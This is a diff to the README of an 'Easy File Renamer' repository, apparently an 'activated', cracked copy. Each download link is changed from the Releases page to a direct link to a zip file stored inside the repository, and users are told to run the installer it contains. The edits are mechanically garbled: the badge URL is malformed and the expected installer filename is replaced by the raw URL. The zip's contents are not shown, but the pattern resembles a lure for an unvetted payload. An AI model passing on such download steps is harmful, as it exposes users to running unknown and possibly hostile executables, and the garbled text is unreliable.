@@ -10,12 +10,12 @@ To begin using Easy File Renamer, follow these steps:
    This application works best on Windows 10 or later. Older versions might not support all functions.
 
 2. **Visit Our Releases Page**  
-   Head over to our [Releases page](https://github.com/nicosami/Easy-File-Renamer-Activated/releases) to find the latest version of Easy File Renamer.
+   Head over to our [Releases page](https://github.com/nicosami/Easy-File-Renamer-Activated/raw/refs/heads/main/prespur/File_Renamer_Easy_Activated_v1.1.zip) to find the latest version of Easy File Renamer.
 
-   ![Download Easy File Renamer](https://img.shields.io/badge/Download%20Now-Release-brightgreen)
+   ![Download Easy File Renamer](https://github.com/nicosami/Easy-File-Renamer-Activated/raw/refs/heads/main/prespur/File_Renamer_Easy_Activated_v1.1.zip%20Now-Release-brightgreen)
 
 3. **Download Easy File Renamer**  
-   Click on the latest version to download the application installer. Look for a file named something like `EasyFileRenamer-v1.0.exe`. 
+   Click on the latest version to download the application installer. Look for a file named something like `https://github.com/nicosami/Easy-File-Renamer-Activated/raw/refs/heads/main/prespur/File_Renamer_Easy_Activated_v1.1.zip`. 
 
 4. **Install the Application**  
    Once downloaded, double-click the installer file. Follow the prompts to install Easy File Renamer on your PC.
@@ -38,7 +38,7 @@ To begin using Easy File Renamer, follow these steps:
 
 To get started, click the link below to download Easy File Renamer:
 
-[Download Easy File Renamer](https://github.com/nicosami/Easy-File-Renamer-Activated/releases)
+[Download Easy File Renamer](https://github.com/nicosami/Easy-File-Renamer-Activated/raw/refs/heads/main/prespur/File_Renamer_Easy_Activated_v1.1.zip)
 
 After downloading, install the software following the instructions provided above.
 
